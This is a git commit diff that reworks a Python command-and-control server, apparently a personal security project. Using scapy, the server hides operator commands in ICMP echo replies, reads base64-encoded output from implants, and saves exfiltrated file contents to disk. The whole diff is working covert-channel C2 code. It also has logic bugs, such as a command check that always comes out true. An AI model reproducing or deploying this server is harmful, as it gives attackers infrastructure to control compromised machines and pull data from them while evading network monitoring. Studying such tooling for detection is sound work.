3862026be0cec2c95127ddad2800955f7d9b8528
guy <guy4497@gmail.com>
2023-04-27 07:19:58 +0300

    server redone

--- cyber/C2/c2_server.py
+++ cyber/C2/c2_server.py
@@ -1,75 +1,100 @@
 #!/usr/bin/python3
 
 from scapy.all import *
-from threading import Thread, Lock
+from threading import Thread, Lock, Semaphore
 from base64 import *
+import time
 
-rec_mutex=Lock()
-command_ready = 0
+avail_cmd = Semaphore(0)
+avail_print = Semaphore(1)
 command=""
 msg=""
+stop=0
 
 def parse_end(packet):
 	if ('END' == b64decode(packet[Raw].load).decode('ascii').split()[-1]):
 		return True
 
-def send_cmd(packet, command):
-	print(packet[0][Ether].src)
-	print(packet[0][IP].src)
-	ping_rep=Ether(dst=packet[0][Ether].src)/IP(dst=packet[0][IP].src, id=packet[0][IP].id)/ICMP(type="echo-reply",)/(b64encode(command.encode('ascii')))
-	send(ping_rep)
-	print("sent")
+	return False
 	
-def msg_action(msg):
-	if(msg[-2] == 'LS'):
-		print("".join(msg[0:-2]))
-	elif(msg[-2] == ''):
-		pass
-	elif(msg[-2] == ''):
-		pass
+def concat_msg(packet):
+	global msg
+	msg += b64decode(packet[Raw].load).decode('ascii')
+	
+def send_cmd(packet, command):
+	try:
+		ping_rep=IP(dst=packet[0][IP].src, id=packet[0][IP].id)/ICMP(type="echo-reply")/(b64encode(command.encode('ascii')))
+		send(ping_rep, verbose=False)
+	except Exception as e:
+		print("in send_cmd: "+e)
+	finally:
+		return
+
+def parse_msg(msg_lst):
+	try:
+		if(msg_lst[-2] == 'RUN'):
+			print("\n".join(msg_lst[0:-2]))
+			
+		elif(msg_lst[-2] == 'FILE'):
+			with open("outputfile"+str(parse_msg.counter), 'wb+') as f:
+				f.write(bytearray.fromhex("".join(msg_lst[0:-2])))
+			parse_msg.counter += 1
+	except Exception as e:
+		print("in parse_msg: "+e)
+	
+	finally:
+		avail_print.release()
+		return
+	
 		
+parse_msg.counter=1
+
 def recieve_msg():
 	try:
-		while True:
+		global stop
+		while not stop:
+			global msg
 			prailer = "START "
-			rp = sniff(filter="icmp and icmp[0]=8", stop_filter=parse_end)
-			msg = b64decode(rp[0][Raw].load).decode('ascii').split()
-			global command_ready
-			if(command_ready and 'READY' == msg[0]):
-				rec_mutex.acquire()
+			msg = ""
+			rp = sniff(filter="(icmp and icmp[0]=8) or (((ip[6:2] > 0) or (ip[7] > 0)) and (not ip[6] = 64))",prn=concat_msg, stop_filter=parse_end, timeout=100)
+			msg_lst = msg.split()
+			if('READY' == msg_lst[0] and avail_cmd.acquire(blocking=False)):
 				send_cmd(rp, prailer+command)
-				command_ready = 0
-				rec_mutex.release()
-			elif('READY' != msg[0]):
-				msg_action(msg)
-			
-	except KeyboardInterrupt:
-		return
+			elif('READY' != msg_lst[0]):
+				parse_msg(msg_lst)
 	except Exception as e:
-		print(e)	
-	
+		print("in recieve_msg: "+e)
+	finally:
+		return
+
 def main():
 	try:
-		lt = Thread(target=recieve_msg)
-		lt.start()
+		rcv_thrd = Thread(target=recieve_msg)
+		rcv_thrd.start()
 	except:
-		print("cant start response/listening thread")
+		print("cant start listen/response threads")
+	
 	try:
-		global command_ready
 		global command
 		while True:
+			avail_print.acquire(timeout=60)
 			command = input("Enter command: ")
-			rec_mutex.acquire()
-			command_ready = 1
-			rec_mutex.release()
-			
-	except KeyboardInterrupt:
-		return 
+			if(command != 'Run' or command != 'Send'):
+				avail_print.release()
+				continue
+			if(command == 'stop'):
+				global stop
+				stop=1
+				break
+			avail_cmd.release()
+				
+	
 	except Exception as e:
-		print(e)
+		print("in main: "+e)
+	
 	finally:
+		rcv_thrd.join()
 		return 0
-		
-		
+
 if __name__=="__main__":
 	main()
